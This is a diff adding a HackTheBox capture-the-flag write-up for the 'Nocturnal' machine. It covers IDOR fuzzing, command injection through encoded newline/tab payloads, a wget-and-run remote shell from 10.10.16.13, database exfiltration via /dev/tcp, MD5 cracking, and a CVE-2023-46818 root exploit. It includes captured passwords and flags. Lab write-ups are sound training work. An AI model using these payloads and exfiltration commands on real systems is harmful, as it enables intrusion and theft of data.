@@ -1,0 +1,84 @@
+HackTheBox Machine Report
+-----------------
+
+Machine Name: Noc------
+Difficulty: Easy
+Date: 29/04/2025
+-----------------------
+
+IP: 10.10.11.64
+
+Nmap results:
+	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
+	80/tcp open  http    nginx 1.18.0 (Ubuntu)
+		http-cookie-flags: 
+|   		/: 
+|     		PHPSESSID: 
+|_      		httponly flag not set
+
+# maybe a cookie related vulnerablity?
+
+Guest Cookie: 8amhbr4eln4li53anqogjbotor
+testUser Cookie: 8amhbr4eln4li53anqogjbotor
+
+# creating an account testUser:test > dashboard.php -> a file uploading section
+# maybe a file uploading vulnerablity?
+# IDOR found in the /view.php?username=[username]&file=[file]
+
+using FUFF:
+	ffuf -w /opt/SecLists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=file3.doc' -H 'Cookie: PHPSESSID=8amhbr4eln4li53anqogjbotor' -fs 2985 -mc 200
+
+unames found:
+	1.admin 	2.amanda	3.tobias	4.try
+
+# file privacy.odt found in 'amanda' and the 
+	password: arHkG7HAI68X8s1J
+
+# Go to admin and download the backupfiles from the admin.php
+# further inspection in the admin.php shows the function 'cleanentry()' which is restricts using blacklisted characters in passwords. seems sus!!
+# bash commands with a bit of tweaking can be executed remotedly on that server. 
+	%0Abash%09-c%09"id"%0A where  
+								%0A->newline and %09->tab
+
+# So thats why there were restrictions on the password. Additionally bash remote shell can be executed.
+# Host a server from machine including a file(shell) which contains the command to connect to remote servers.
+	python -m http.server 8000
+
+# wget the file from the client machine
+	%0Abash%09-c%09"wget%0910.10.16.13:4444/shell"%0A
+
+# execute the bash shell
+	%0Abash%09-c%09"bash%09shell"%0A
+
+# once connected retrieve the nocturnal_database.db from 
+	../nocturnal_database/nocturnal_database.db
+	using:
+		../nocturnal_database/nocturnal_database.db > /dev/tcp/10.10.16.13/8888
+
+# given a SQLite db use sqlitebrowser to inspect the database
+# the hashes are MD5 encoded
+# decode the tobias hash and ssh into the machine
+	decoding:
+		john tobias.hash --format=Raw-MD5 --wordlist=/opt/rockyou.txt
+	password:
+		slowmotionapocalypse
+
+# ssh into the server and retrieve the user flag
+	user_flag: 8b07aa89e252af94ea4b0752fddd2c2d
+
+# check the networks for more information
+	ss -tuln
+
+# found something hosted on localhost:8080
+# Use ssh to forward the local port to that remote service
+	ssh tobias@nocturnal.htb -L 4444:127.0.0.1:8080
+
+# access it through the browser and in the html there is version of the ISPconfig
+# use it to find the exploit
+	CVE-2023-46818.py
+
+# run the python exploit to get a ispconfig-shell (root shell):
+# read the contents of root.txt
+	root_flag:9c1706a0d6d2c663a5aded7b2de80a15
+
+# Cleanup: remove every file from the remote server and disconnect the port forwarding
